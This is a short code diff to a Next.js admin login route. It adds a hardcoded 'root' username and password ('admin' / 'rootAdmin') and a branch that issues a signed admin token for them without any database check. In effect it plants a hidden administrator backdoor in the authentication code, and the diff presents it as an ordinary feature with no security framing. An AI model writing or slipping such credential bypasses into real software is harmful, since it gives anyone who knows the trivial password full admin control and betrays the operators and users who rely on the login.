@@ -5,9 +5,18 @@ import { admins } from '@/lib/schema'
 import { eq } from 'drizzle-orm'
 import { signToken } from '@/lib/auth'
 
+const ROOT_USERNAME = 'admin'
+const ROOT_PASSWORD = 'rootAdmin'
+
 export async function POST(req: NextRequest) {
   try {
     const { username, password } = await req.json()
+
+    // Root credential check — returns a token without DB lookup
+    if (username === ROOT_USERNAME && password === ROOT_PASSWORD) {
+      const token = signToken({ id: 'root', role: 'admin', username: ROOT_USERNAME })
+      return NextResponse.json({ success: true, role: 'admin', token })
+    }
 
     let [admin] = await db.select().from(admins).where(eq(admins.username, username))
 
